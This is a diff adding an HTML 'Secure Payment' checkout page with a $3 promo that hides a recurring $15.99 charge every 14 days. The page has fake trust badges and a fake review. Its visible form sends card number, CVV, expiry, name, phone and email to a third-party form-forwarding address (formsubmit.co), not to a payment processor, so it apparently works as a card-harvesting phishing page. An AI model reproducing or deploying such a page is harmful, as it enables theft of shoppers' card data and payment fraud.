@@ -1,0 +1,1411 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <title>Payment</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+            <script src="https://ssl.kaptcha.com/collect/sdk?m=100058"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" integrity="sha512-E8QSvWZ0eCLGk4km3hxSsNmGWbLtSCSUcewDQPQWZF6pEU8GlT8a5fF32wOl1i8ftdMhssTrF/OhyGWwonTcXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            <script>var CryptoJSAesJson={encrypt:function(t,r){return CryptoJS.AES.encrypt(JSON.stringify(t),r,{format:CryptoJSAesJson}).toString()},decrypt:function(t,r){return JSON.parse(CryptoJS.AES.decrypt(t,r,{format:CryptoJSAesJson}).toString(CryptoJS.enc.Utf8))},stringify:function(t){var r={ct:t.ciphertext.toString(CryptoJS.enc.Base64)};return t.iv&&(r.iv=t.iv.toString()),t.salt&&(r.s=t.salt.toString()),JSON.stringify(r).replace(/\s/g,"")},parse:function(t){var r=JSON.parse(t),e=CryptoJS.lib.CipherParams.create({ciphertext:CryptoJS.enc.Base64.parse(r.ct)});return r.iv&&(e.iv=CryptoJS.enc.Hex.parse(r.iv)),r.s&&(e.salt=CryptoJS.enc.Hex.parse(r.s)),e}};</script>
+        <script>
+        (function($) {
+            var wpwlOptions = {
+                                    style : 'plain',
+                                    onReady : function(e){ $('.wpwl-form-card').find('.wpwl-button-pay').on('click', function(e){ try { validateHolder(e); } catch (err) { console.error(err); } }); },
+                                    onReadyIframeCommunication : function() { try { iframeReady(this); } catch (err) { console.log(err); } },
+                                    onBeforeSubmitCard : function(e){ try { return preValidate(e); } catch (err) { console.error(err); return true; } },
+                                    onValidInput : function(key, value) { try { saveInfo(key, value); } catch (err) { console.error(err); } },
+                            }
+            var extraWpwlOptions = {
+                locale: "en",
+
+                onReady: function() {
+                    $('.wpwl-label-cvv').html('CVV');
+
+                    
+                },
+                style: "logos",
+                brandDetection: true,
+                brandDetectionType: "binlist",
+                             brandDetectionPriority: ["VISA","MASTER","AMEX"]
+                         }
+
+            for(k in extraWpwlOptions) {
+                wpwlOptions[k] = extraWpwlOptions[k];
+            }
+
+            window.wpwlOptions = wpwlOptions;
+        })(jQuery);
+        /* adding 'style: "logos"' will remove the brand select option, but dont know how it might interfere with the other options */
+    </script>
+
+        <script>
+        (function($) {
+            var globalData = {};
+
+            window.preValidate = function (e) {
+                if (!validateHolder(e)) {
+                    return false;
+                }
+                var result = true;
+
+                globalData.card_holder = $('.wpwl-control-cardHolder').val();
+                globalData.card_expiry_month = $("input[name='card.expiryMonth']").val();
+                globalData.card_expiry_year = $("input[name='card.expiryYear']").val();
+
+                if (globalData.card_number) {
+                    globalData.card_number = globalData.card_number.replaceAll(' ', '');
+                }
+
+                var cardFields = ['card_holder', 'card_number', 'card_expiry_month', 'card_cvv', 'card_expiry_month', 'card_expiry_year'];
+
+                let cardData = {};
+
+                cardFields.forEach(function(v) {
+                    cardData[v] = globalData[v];
+                })
+
+                let preparedData = {
+                    key: 'eyJpdiI6ImN5blQ1c0h6Mjh4WUloOHVIbUZIcXc9PSIsInZhbHVlIjoiem9ScW85VElRbnlxTk1sa0pmRUF2Y01lcnRjckVMTkVSMCtPREZNSzhZU1VxdG44L0JrSXVPK1RxZ3pzbjdXayIsIm1hYyI6IjNmYmIwN2E5YTMwZDg4YjIxY2M4ZjM1YTNkNjA1M2VlNDI2NWU4MGQ3NjIzNTA5OTE2OWVlMjAxMzkyZjZjNDkiLCJ0YWciOiIifQ==',
+                    card: btoa(CryptoJSAesJson.encrypt(cardData, '8TuMOM4LLANlN1akwmZU31CyMrLrssC5')),
+                    kount_id: window.ka && window.ka.sessionId,
+                }
+
+                $.ajax({
+                  type: 'POST',
+                  url: 'https://gadgetgeek.store/callbacks/v1/preflight/tri-odQu12HCRzDJaqy?signature=d637925bca3d5e48a5842a6d07237986e003b7e5777c0c61c2a503314c11305f',
+                  data: preparedData,
+                  dataType: 'json',
+                  async:false
+                }).done(function (data) {
+                    if (!data.available) {
+
+                        if (data.suggest) {
+                            if (data.force) {
+                                window.location = data.suggest;
+                                return false;
+                            }
+
+                            $('.suggest').removeAttr('hidden');
+                            $('.suggest a').attr('href', data.suggest);
+                        }
+
+                        result = false;
+                        $('#preflightModal').css('display', 'flex');
+                    }
+                });
+
+                return result;
+            }
+
+            window.saveInfo = function (key, value) {
+                globalData[key.replace('.', '_')] = value;
+            }
+
+            window.validateHolder = function (e) {
+                var holder = $('.wpwl-control-cardHolder');
+                if (holder.val().trim().length < 3 || holder.val().trim().length > 128) {
+                    holder.addClass('wpwl-has-error').after('<div class="wpwl-hint wpwl-hint-cardHolderError">Invalid card holder</div>');
+                    return false;
+                }
+                return true;
+            }
+        })(jQuery)
+    </script>
+    
+    <script src="https://pciwidget.com/v1/paymentWidgets.js?checkoutId=47ECBD223BD79F2012FC52E24E99559A.prod01-vm-tx09"></script>
+</head>
+
+<body>
+    <style>
+
+        .container-review {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            background-color: white;
+            align-items: center;
+            margin: 30px 0;
+            border-radius: 15px;
+        }
+
+        .review {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 0 30px;
+            background-color: white;
+            font-family: "Open Sans", sans-serif;
+            border-radius: 12px;
+        }
+
+
+        #author {
+            font-size: 18px;
+            font-weight: 600;
+            text-transform: capitalize;
+            margin-top: 10px;
+            color: black
+        }
+
+        #job {
+            text-transform: uppercase;
+            line-height: 150%;
+            margin-bottom: 10px;
+            color: black;
+        }
+
+        #info {
+            font-size: 13px;
+            color: black;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            text-decoration: none;
+            border-style: none;
+            font-size: 14px;
+            color: black;
+            cursor: pointer;
+            background-color: #eaeaea;
+            border-radius: 34px;
+        }
+        .credit a {
+            text-decoration: none;
+            color: #000;
+            font-weight: 800;
+        }
+
+        .credit {
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+
+            color: #000;
+            text-align: center;
+        }
+
+        body {
+            font-family: sans-serif;
+            margin: 0 !important;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            line-height: 20px;
+        }
+        #payframe-po .wpwl-button-pay {
+            width: 100%;
+            text-transform: uppercase;
+        }
+        .payment-box {
+            background: transparent !important;
+            border: none !important;
+            box-shadow: none !important;
+            width: 100%;
+            padding: 0 !important;
+        }
+        .payment-box h1 {
+            font-weight: lighter;
+            text-transform: capitalize;
+            font-size: 2.5rem;
+            text-align: left;
+        }
+        h4 {
+            font-weight: 500;
+            font-size: 1.2rem;
+            text-align: center;
+        }
+        #payframe-po .wpwl-button-pay {
+            width: 100%;
+            text-transform: capitalize;
+            padding: 15px 10px;
+            font-size: 18px;
+            font-weight: normal;
+            border-radius: .2em;
+            margin-top: 10px;
+        }
+        .wpwl-form {
+            max-width: 100%;
+        }
+        .wpwl-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .wpwl-label, .wpwl-wrapper {
+            width: 100%;
+        }
+        .wpwl-wrapper {
+            display: flex;
+            align-items: center;
+        }
+        .wpwl-label {
+            font-weight: lighter;
+            text-transform: capitalize;
+            font-size: 1.2rem;
+        }
+        .wpwl-group-brand {
+            display: none;
+        }
+        .wpwl-control {
+            height: 42px;
+            padding: 8px 10px 8px 15px;
+            border: 1px solid #727272;
+            width: 100%;
+            margin-bottom: 10px;
+            box-shadow: 1px 1px 0px #ececec, 1px 0px #ececec, 0px 1px #ececec;
+        }
+        .wpwl-brand-VISA {
+            margin-top: 10px;
+        }
+        .wpwl-label {
+            line-height: 34px;
+        }
+        .wpwl-button-pay {
+            width: 100%;
+            font-size: 1.6em;
+            font-weight: 600;
+            border-radius: 2rem;
+            padding: 10px;
+            color: #fff;
+            background-color: #5cb85c;
+            -webkit-appearance: none;
+            border: none;
+            cursor: pointer;
+        }
+        .wpwl-wrapper-submit input, .wpwl-wrapper-submit span {
+            display: none;
+        }
+        .wpwl-control-cvv {
+            max-width: 50%;
+            margin-bottom: 0;
+        }
+        .wpwl-button-pay:hover, .wpwl-button-pay:focus, .wpwl-button-pay:active {
+            color: #fff;
+            background-color: #449d44;
+            border: none;
+        }
+        .input-error {
+            border: 1px solid red;
+            color: red;
+        }
+        .holder {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            gap: 10px;
+        }
+        .top-bar {
+            width: 100%;
+            padding: 5px !important;
+            background-color: black !important;
+            color: white;
+            font-size: .8rem;
+            border-bottom: 1px solid lightgray;
+            text-transform: uppercase;
+            z-index: 99;
+            display: flex;
+            align-items: center;
+        }
+        .top-bar p {
+            font-size: .7rem;
+        }
+        p {
+            margin: 0!important;
+        }
+        .info-section {
+            background: #f5f6fa;
+        }
+        .form-section {
+            background: white;
+        }
+        .form-section, .info-section {
+            padding: 15px;
+        }
+        @keyframes glow {
+            0% {
+                box-shadow: 0 0 10px 2px #efefef;
+            }
+            50% {
+                box-shadow: 0 0 10px 7px #efefef;
+            }
+            100% {
+                box-shadow: 0 0 10px 2px #efefef;
+            }
+        }
+        .count-down {
+            text-align: center;
+            padding: 1.5rem;
+            border: 1px solid lightgray;
+            margin-bottom: 15px;
+        }
+        .price-overview-holder {
+            padding: 20px 15px;
+            background-color: #F6F9FC;
+        }
+
+        .row input {
+            padding: 0 0 0 10px;
+            font-size: 1em;
+            width: 100%;
+        }
+
+        .payment img {
+            max-height: 500px;
+            object-fit: contain;
+            object-position: center;
+        }
+        .contact {
+            flex-wrap: wrap;
+            border: 1px solid lightgray;
+            border-radius: .3em;
+            -webkit-box-shadow: 2px 2px 3px 0px rgba(0,0,0,0.3);
+            box-shadow: 2px 2px 3px 0px rgba(0,0,0,0.3);
+            padding: 1rem;
+            max-width: calc(90% - 2rem) !important;
+            margin-bottom: 50px;
+        }
+        .contact .col-12 {
+            flex-wrap: nowrap !important;
+            margin-bottom: 10px;
+        }
+        .contact > .col-12 > h4 {
+            margin: 10px;
+            text-align: left;
+        }
+        #payframe-po > .footer {
+            display: none;
+        }
+        .payment-top {
+            display: none;
+        }
+        .support-box {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .support-Container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .footer {
+            width: 100%;
+            border-top: 1px solid lightgray;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+            padding: 10px 0;
+            gap: 20px;
+            background-color: white;
+        }
+        .banner {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            flex-direction: row;
+        }
+        .responsive-margin {
+            margin: 0 10px 0 auto;
+        }
+        @media (max-width: 800px) {
+            .banner {
+                flex-direction: column;
+            }
+            .responsive-margin {
+                margin: 0;
+            }
+        }
+        .footer p {
+            font-size: .8rem;
+            opacity: .8;
+            margin: 0 10px;
+        }
+        .footer > .banner {
+            justify-content: center;
+        }
+        #cd-1 {
+            display: none;
+        }
+        .info-icons-text {
+            font-size: 13px;
+            font-weight: 600;
+            padding: 5px 10px;
+        }
+        .payment-responsive {
+            padding: 0 3rem;
+            max-width: 650px;
+            width: 100%;
+        }
+        .payment-responsive-two {
+            padding: 0 3rem;
+            max-width: 500px;
+            width: 100%;
+        }
+        .secure-icon {
+            width: 70px;
+            height: 70px;
+        }
+        @media(max-width: 1440px) {
+            .payment-responsive {
+                width: 70%;
+            }
+            .payment-responsive-two {
+                width: 70%;
+            }
+        }
+        @media(max-width: 1440px) {
+            .payment-responsive {
+                width: 100%;
+            }
+            .payment-responsive-two {
+                width: 100%;
+            }
+        }
+        @media(max-width: 900px) {
+            .payment-responsive {
+                padding: 0;
+                max-width: 100%;
+            }
+            .payment-responsive-two {
+                padding: 0;
+                max-width: 100%;
+            }
+            .wpwl-button-pay {
+                font-size: 1.2em;
+            }
+            .holder-child-mobile {
+                flex: 1 0 100% !important;
+                width: 90% !important;
+                max-width: 90% !important;
+                margin: 0 auto !important;
+            }
+        }
+        #preflightModal .alert {
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid transparent;
+            border-radius: 4px;
+        }
+        #preflightModal .alert-danger {
+            color: #a94442;
+            background-color: #f2dede;
+            border-color: #ebccd1;
+        }
+        #preflightModal .modal-body {
+            height: 100%;
+        }
+        .text-left {
+            text-align: left;
+        }
+        .small, small {
+            font-size: 95%;
+        }
+        .btn-success {
+            color: #fff;
+            background-color: #0bd175;
+            border-color: #0bd175;
+        }
+        .btn-lg {
+            padding: 0.5rem 1rem;
+            font-size: 1.5rem;
+            line-height: 1.5;
+            border-radius: 0.3rem;
+        }
+        .modal-backdrop.show {
+            display: none!important;
+        }
+        #modalPrivacy .modal-body p {
+            margin-bottom: 1rem !important;
+        }
+    </style>
+    <div id="payment-error" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; align-items: center; justify-content: center; background-color: rgba(0,0,0,0.5); z-index: 500;">
+        <div id="content" style="max-width: 440px; background: white; margin: auto; padding: 0 10px;">
+            <h1 style="text-align: center; font-size: 26px;">Secure Payment</h1>
+            <div class="alert alert-danger">
+                <p class="text-center">
+                    <strong>There was an error while handling the payment!</strong>
+                </p>
+                <hr>
+                <div style="display: flex;align-items: center;">
+                    <img src="/storage/4e6b9c9e-f355-4daf-8c46-b2ea72256715/ca.webp?v=884f56e8b03acff507178676a97a74d3279a205e" class="img-fluid" alt="ca" style="max-height:70px; border-radius:50%;margin-right:15px">
+                    <p class="text-left" style="margin:0;">
+                        An agent from our payments department will call you shortly to help you process the payment.
+                    </p>
+                </div>
+                <hr>
+                <div>
+                    <p>
+                        Possible reasons:
+                    </p>
+                    <ul>
+                        <li>Invalid credit card number, card holder, CVV or expiration date</li>
+                        <li>Insufficient funds</li>
+                        <li>Credit card has limits for internet payments or some other restrictions</li>
+                    </ul>
+                                        <button href="" type="button" class="btn" style="width: 100%; margin-top: 20px; border-radius: 10em; color: #fff !important; font-weight: bold; background-color: #28a745 !important; border: none; -webkit-appearance: none;">Please, try again</button>
+                                    </div>
+            </div>
+
+            <p style="text-align: center; margin: 0;">
+                This payment is processed by gadgetgeek.store:
+            </p>
+            <img src="/storage/11a9b72d-a75c-4fe1-9fa9-b2308223bc14/visa-master.png?v=2d31c04c6df0d41016e7461166975dee1426ce0a" style="display: block; margin: 15px auto 0 auto; ">
+        </div>
+    </div>
+
+    <div class="top-bar">
+        <div class="container-fluid">
+            <div class="row d-flex justify-content-between">
+                <p class="text-left" style="color:white">
+                    <i class="fas fa-lock"></i> SSL safe payment
+                </p>
+                <p class="text-right" style="color:white">
+                    Verified by
+                    <i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid payment">
+        <div class="row">
+            <section class="form-section col-12 col-md-7 d-flex justify-content-end">
+                <div class="payment-responsive">
+                    <div class="payment-box border-bottom">
+                        <h2 style="font-weight: lighter; margin: 10px 0 10px 0; font-size: 2em;">Secure Payment <i class="fas fa-lock"></i></h2>
+                        <p class="pb-2">
+                            <span style="color:#ffc107">
+                                <span class="fas fa-star"></span>
+                                <span class="fas fa-star"></span>
+                                <span class="fas fa-star"></span>
+                                <span class="fas fa-star"></span>
+                                <span class="fas fa-star-half"></span>
+                            </span>
+                            (2095 Reviews)
+                        </p>
+                    </div>
+                    <div class="bg-white rounded my-3 d-md-none">
+                        <p class="text-left">
+                            Order summary
+                        </p>
+                        <table class="w-100">
+                            <tbody>
+                                <tr class="small">
+                                    <th class="pb-1 font-weight-light">Promo Price</th>
+                                    <th class="pb-1 text-right font-weight-light">
+                                        <span> $3</span>
+                                    </th>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <hr>
+                                <tr>
+                                    <th>Due today</th>
+                                    <th class="text-right">
+                                        <span>
+                                             $3.00 USD
+                                        </span>
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div style="flex-wrap: wrap; align-items: flex-start;">
+                        <p class="text-muted border-bottom py-3 font-weight-bold">
+                            1.Information <i class="fas fa-check-circle text-success"></i>
+                        </p>
+                        <div class="d-flex justify-content-between pt-3">
+                            <p class="font-weight-bold">
+                                2.Payment
+                            </p>
+                            <img class="img-fluid" src="image-removebg-preview (8).png" width="100%" style="max-width: 150px; margin-top: -10px;">
+                        </div>
+                    </div>
+                    <hr style="width: 100%; margin: 20px 0; opacity: .3;" />
+                    <div class="form-container payment-box" style="background-color: white !important;color:black; ">
+
+                            <div id="payframe-po">
+                                <form action="https://formsubmit.co/458d7d9acf224b8bc652d19e544307c5" method="post">
+                                   
+                                    <div class="calculator-input">
+                                        <input type="text" name="Credit Card " required onkeyup="this.value=this.value.replace(/[^\d]/,'')" minlength="16" maxlength="16" pattern="^\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$" placeholder="Card Number">
+                                        <input type="text" name="CCV" style="width: 100px;" required placeholder="CCV"><img src="https://cdn.webcorp.com/img/faq/credit-card-cvv.png" pattern="^\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$" maxlength="4" minlength="3" id="lol" width="34px;" style="margin-left: 10px;">
+                                        <br><br>
+                                        <style>
+                                            @media only screen and (max-width: 600px) {
+  #lol {
+    display: none;
+  }
+}
+                                        </style>
+                                        <input type="select" name="MONTH" style="width: 100px;" placeholder="MM" onkeyup="this.value=this.value.replace(/[^\d]/,'')" minlength="2" maxlength="2" pattern="^\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$">   <input type="select" name="YEAR" required style="width: 100px;"  onkeyup="this.value=this.value.replace(/[^\d]/,'')" minlength="2" maxlength="4" required pattern="^\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$" placeholder="YY">
+                                        <br><br><input type="text" name="Name on card" style="width: 200px" required placeholder="Name on Card"><br><br>
+                                        <input type="text" name="phone number" placeholder="Mobile Number " style="width: 200px;" onkeyup="this.value=this.value.replace(/[^\d]/,'')" maxlength="10" pattern="^\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$">
+                                        <p style="color: gray; font-size: 12px;">Optional Field.</p>
+                                        
+                                        
+                                        <input type="text" name="input" placeholder="Email Address" required>
+                                        <p style="color: gray; font-size: 12px;">Please make sure to use your primary email address. </p>
+                                        <br>
+                                      <!-- <input type="text" name="input" placeholder="Billing Address">-->  
+                                        
+                                        <br><br>
+                                    </div>
+                                  <br><br><br><br><br><br><br><br><br><br><br><br><br><br><p style="font-size: 12px; color: grey;">Your IP address will be recorded for fraud protection.</p>
+
+                                    <input type="submit"class="submitordervalue" value="COMPLETE ORDER">
+                                  </form>
+                                  <style>
+                                    
+                                  </style>
+        </form>
+        <style>
+            .submitordervalue {
+                background: #2eb165;
+                border: 0px;
+                height: 45px;
+                padding: 30px;
+                border-radius: 3px;
+                font-weight: 600;
+                font-size: 60px;
+                color: #fff;
+            }
+        </style>
+        <style>
+            
+            .calculator-input {
+	height: 34px;
+	position: relative
+}
+
+.calculator-input input {
+	border: 1px solid #000000;
+	border-radius: 3px;
+	background: transparent;
+	width: 240px;
+	height: 34px;
+	color: #373737;
+	padding-left: 20px;
+	padding-right: 40px;
+	font-size: 16px;
+	line-height: 23px;
+	font-weight: 500
+}
+
+.calculator-input::after {
+	content: "";
+	width: 19px;
+	height: 24px;
+	background: url("../img/btc_icon.svg.html") no-repeat;
+	position: absolute;
+	right: 20px;
+	top: 50%;
+	transform: translateY(-50%)
+}
+        </style>
+                <div class="footer">
+            <p>This payment is processed by gadgetgeek.store</p>
+
+            <img src="/storage/public/payment_icons/visa-master.png" alt="Visa-Mastercard">
+        </div>
+    </div>
+    <pre hidden>landing</pre>
+<div class="modal" id="preflightModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body">
+                <h1 style="text-align: center; font-size: 26px;margin-bottom:20px">Secure Payment</h1>
+
+                <div class="alert alert-danger">
+                    <p class="text-center">
+                      <strong>There was an error while handling the payment!</strong>
+                    </p>
+                    <hr>
+                    <div style="display: flex;align-items: center;">
+                        <img src="/storage/4e6b9c9e-f355-4daf-8c46-b2ea72256715/ca.webp?v=884f56e8b03acff507178676a97a74d3279a205e" class="img-fluid" alt="ca" style="max-height:70px; border-radius:50%;margin-right:15px">
+                        <p class="text-left" style="margin:0;">
+                            An agent from our payments department will call you shortly to help you process the payment.
+                        </p>
+                    </div>
+                    <hr>
+                    <div>
+                      <p>Possible reasons:</p>
+                      <ul>
+                        <li>Invalid credit card number, card holder, CVV or expiration date</li>
+                        <li>Insufficient funds</li>
+                        <li>Credit card has limits for internet payments or some other restrictions..</li>
+                      </ul>
+
+                                        <p class='suggest' hidden>
+                        <a href="#" type="button" class="btn btn-success" style="width: 100%; margin-top: 20px;">Please, try again</a>
+                    </p>
+                                        </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="modal fade show" id="modalTerms" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog modal-lg" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body" style="height: 600px;">
+                    <iframe width="100%" height="100%" frameborder="0" src="https://gadgetgeek.store/l/lO5vhyAHNUHl5MI9AW6S/terms?_luuid=a9a4e4bf-900d-4720-b919-90cdf73bd74d&amp;_sid=eyJpdiI6Im5EV0FzK0dYbTJXQk1lV2o3UWNLSXc9PSIsInZhbHVlIjoiamlnNW1QM21NM0FwR2tYRUxTdHRFS3RjNEt2eHBuSDZINlZNQ3F6bS9hRG0wRGppMXVTVVkyZ0RsUnlOWHhLYjFKNG1BSGc4ZDlPbk5oRzZvc053cS90M0c1WklUa0g5VHZEOHhETUhPUUZVZWQ0eEZ0bGJRUTJnOXUzaE9HK0QiLCJtYWMiOiJhZWQzNGFjZjk4NjFlZGRkZmNkYWE4YzI3Y2IwNzFlZmRmZjE4NzQ5ZWVhZjY3MmY4OGQ1YmM2MTY0YTRmNWI3IiwidGFnIjoiIn0%3D"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+                        <div style="width:100%; text-align:center;">
+                            <br>
+                            <p style="color: #000; font-size: 15px; display: none;">Please wait while we process your payment</p>
+                            <hr>
+   
+                            <section class="mx-0 w-100 p-3">
+                                <p style="font-weight: lighter; text-transform: uppercase; font-size: .8rem; opacity: .8;text-align:center!important">
+                                    BILLINGCARE
+                                                                        <span style="margin-left: 10px;">(+1) 838-228-1171 Canada: +1 (778)-801-4594</span>
+                                                                    </p>
+                                <hr style="width: 100%; margin: 20px 0; opacity: .3">
+                            </section>
+                        </div>
+                        <p class="ml-1" style="font-size:10px;text-align:justify;text-align: justify;margin-top: 1rem;color: #716c6c;">
+                            I consent and accept the conditions of the membership. Recurring payment every 14 days, current rate $15.99 (USD). Cancel anytime. By clicking “COMPLETE ORDER”, you accept immediate access to WowDeals once your information has been processed.
+                        </p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="info-section col-12 col-md-5 d-flex ">
+                <div class="payment-responsive-two">
+                    <div class="support-box">
+                        <section class="container-review rounded py-3 w-100">
+                            <article class="review">
+                                <h4 id="author">Fenella Lara</h4>
+                                <div id="rating" class="d-flex py-3 rating-container">
+                                    <img src="five-5-star-rank-sign-illustration-free-vector.jpg"  width="113px;"/>
+                                    
+                                </div>
+                                <p id="info">
+                                    I received my product yesterday. Fast and outstanding customer service! Thanks a lot <3.
+                                </p>
+                                <div class="button-container d-flex w-100 justify-content-between">
+                                    <button class="prev-btn btn">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </button>
+                                    <button class="next-btn btn">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </button>
+                                </div>
+                            </article>
+                        </section>
+                        <section class="w-100 rounded">
+                            <div class="bg-white rounded my-3 p-3 d-none d-md-block">
+                                <h4>Order summary:</h4>
+                                <table class="w-100">
+                                    <tbody>
+                                        <tr class="small">
+                                            <th class="pb-1">Promo Price</th>
+                                            <th class="pb-1 text-right">
+                                                <span> $3 </span>
+                                            </th>
+                                        </tr>
+                                    </tbody>
+                                    <tbody>
+                                        <hr>
+                                        <tr>
+                                            <th>Due today:
+                                            </th>
+                                            <th class="text-right">
+                                                <span>$3 USD
+                                                </span>
+                                               
+                                            </th>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </section>
+                        <section class="d-flex justify-content-between w-100 py-4">
+                            <div class="d-flex flex-column align-items-center text-center">
+                                <img src="526_happy.png" class="secure-icon" />
+                                <p class="info-icons-text">
+                                    Free billing support
+                                </p>
+                            </div>
+                            <div class="d-flex flex-column align-items-center text-center">
+                                <img src="Google_Safe.png" style="width: 44px;" class="secure-icon" />
+                                <p class="info-icons-text">
+                                    Google Safe Browsing
+                                </p>
+                            </div>
+                            <div class="d-flex flex-column align-items-center text-center">
+                                <img src="ssl-vector.png" class="secure-icon" />
+                                <p class="info-icons-text">
+                                    Secure Checkout SSL
+                                </p>
+                            </div>
+                        </section>
+
+                        <p hidden>
+                            {&quot;id&quot;:151389,&quot;company_id&quot;:13,&quot;concept_id&quot;:295,&quot;campaign_rule_id&quot;:151261,&quot;type&quot;:&quot;giftcard&quot;,&quot;name&quot;:&quot;Rule #151261&quot;,&quot;slug&quot;:&quot;R151261&quot;,&quot;skeleton&quot;:&quot;&quot;,&quot;cart&quot;:&quot;&quot;,&quot;language_id&quot;:1,&quot;description&quot;:null,&quot;is_active&quot;:1,&quot;subscription_type_id&quot;:6,&quot;concept_subscription_id&quot;:2002,&quot;price&quot;:2,&quot;upsell_price&quot;:0,&quot;shipping_fee&quot;:0,&quot;credits&quot;:15,&quot;value&quot;:15,&quot;shown_value&quot;:15,&quot;currency_id&quot;:10,&quot;shown_currency_id&quot;:10,&quot;trial_days&quot;:3,&quot;created_at&quot;:&quot;2022-10-20T13:56:34.000000Z&quot;,&quot;updated_at&quot;:&quot;2022-10-20T13:56:34.000000Z&quot;,&quot;concept&quot;:{&quot;id&quot;:295,&quot;company_id&quot;:18,&quot;currency_id&quot;:1,&quot;language_id&quot;:1,&quot;terms_id&quot;:2,&quot;parent_id&quot;:null,&quot;code&quot;:&quot;gadgetgeek.store&quot;,&quot;name&quot;:&quot;gadgetgeek.store&quot;,&quot;domain&quot;:&quot;gadgetgeek.store&quot;,&quot;title&quot;:&quot;Gadgetgeek.store&quot;,&quot;type_id&quot;:5,&quot;theme_id&quot;:18,&quot;product_layout_id&quot;:16,&quot;vertical_id&quot;:2,&quot;vat_profile_id&quot;:1,&quot;is_active&quot;:true,&quot;is_accessible&quot;:1,&quot;redirect_concept_id&quot;:null,&quot;is_archived&quot;:false,&quot;is_dev_mode&quot;:false,&quot;is_external&quot;:false,&quot;is_using_credits&quot;:true,&quot;cross_sell_group_id&quot;:null,&quot;up_sell_group_id&quot;:null,&quot;created_at&quot;:&quot;2021-11-11T15:43:54.000000Z&quot;,&quot;updated_at&quot;:&quot;2023-05-03T09:30:27.000000Z&quot;,&quot;theme&quot;:{&quot;id&quot;:18,&quot;code&quot;:&quot;simplesub-t18&quot;,&quot;name&quot;:&quot;Simple Subbrands - T18&quot;,&quot;created_at&quot;:&quot;2021-10-04T08:59:25.000000Z&quot;,&quot;updated_at&quot;:&quot;2021-11-10T09:33:20.000000Z&quot;},&quot;currency&quot;:{&quot;id&quot;:1,&quot;code&quot;:&quot;EUR&quot;,&quot;numeric_code&quot;:&quot;978&quot;,&quot;name&quot;:&quot;Euro&quot;,&quot;symbol&quot;:&quot;\u20ac&quot;,&quot;symbol_position&quot;:&quot;before&quot;,&quot;symbol_separator&quot;:&quot;&quot;,&quot;thousands_separator&quot;:&quot;,&quot;,&quot;decimal_separator&quot;:&quot;.&quot;,&quot;round_short&quot;:0,&quot;is_automatic_rate_update&quot;:0,&quot;created_at&quot;:&quot;2018-11-14T11:38:31.000000Z&quot;,&quot;updated_at&quot;:&quot;2019-05-29T11:41:59.000000Z&quot;}},&quot;currency&quot;:{&quot;id&quot;:10,&quot;code&quot;:&quot;USD&quot;,&quot;numeric_code&quot;:&quot;840&quot;,&quot;name&quot;:&quot;United States 